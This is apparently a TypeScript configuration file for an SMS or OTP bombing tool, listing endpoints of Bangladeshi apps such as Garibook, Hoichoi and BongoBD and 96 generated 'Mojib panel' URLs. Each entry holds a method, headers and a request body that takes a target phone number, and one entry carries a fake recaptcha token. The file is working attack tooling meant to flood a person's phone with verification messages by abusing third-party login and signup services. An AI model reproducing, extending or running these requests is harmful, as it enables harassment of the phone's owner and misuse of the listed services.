import { ApiNode } from './types';

// Placeholders:
// {phone} -> Raw input (e.g. 017...)
// {phone_88} -> With 88 prefix (e.g. 88017...)
// {phone_p88} -> With +88 prefix (e.g. +88017...)

const EXISTING_NODES: ApiNode[] = [
  { 
    id: '1',
    name: "Garibook", 
    url: "https://api.garibookadmin.com/api/v3/user/login",
    method: "POST",
    headers: '{"Content-Type": "application/json"}',
    body: '{"mobile": "{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"}'
  },
  { 
    id: '2',
    name: "Quizgiri", 
    url: "https://developer.quizgiri.xyz/api/v2.0/send-otp",
    method: "POST",
    headers: '{"content-type": "application/json", "authorization": "Bearer"}',
    body: '{"country_code": "+88", "phone": "{phone}"}'
  },
  { 
    id: '3',
    name: "DeeptoPlay", 
    url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en",
    method: "POST",
    headers: '{"content-type": "application/json"}',
    body: '{"number": "{phone_p88}"}'
  },
  { 
    id: '4',
    name: "Mojaru", 
    url: "https://new.mojaru.com/api/student/login",
    method: "POST",
    headers: '{"content-type": "application/json"}',
    body: '{"mobile_or_email": "{phone}"}'
  },
  { 
    id: '5',
    name: "Swap", 
    url: "https://api.swap.com.bd/api/v1/send-otp/v2",
    method: "POST",
    headers: '{"Content-Type": "application/json"}',
    body: '{"phone": "{phone}"}'
  },
  {
    id: '6',
    name: "BongoBD",
    url: "https://api.bongobd.com/api/login/send-otp",
    method: "POST",
    headers: '{"Content-Type": "application/json"}',
    body: '{"operator": "all", "msisdn": "{phone_88}"}'
  },
  {
    id: '7',
    name: "Hoichoi",
    url: "https://prod-api.viewlift.com/identity/signup/otp?site=hoichoitv",
    method: "POST",
    headers: '{"Content-Type": "application/json"}',
    body: '{"phoneNumber": "{phone_p88}"}'
  },
  {
    id: '8',
    name: "Corki",
    url: "https://corki.bd/api/auth/otp",
    method: "POST",
    headers: '{"Content-Type": "application/json"}',
    body: '{"phone": "{phone}"}'
  }
];

// Generate 96 Mojib Panel APIs (api1 to api96)
// CHANGED: Updated to HTTPS as SSL is now active on the server
const MOJIB_NODES: ApiNode[] = Array.from({ length: 96 }, (_, i) => {
    const num = i + 1;
    return {
        id: `mojib_${num}`,
        name: `Mojib-API-${num}`,
        url: `https://panel.mojib.me/api${num}.php?phone={phone}`,
        method: 'GET',
        headers: '{}',
        body: '{}'
    };
});

export const INITIAL_API_NODES: ApiNode[] = [
  ...EXISTING_NODES,
  ...MOJIB_NODES
];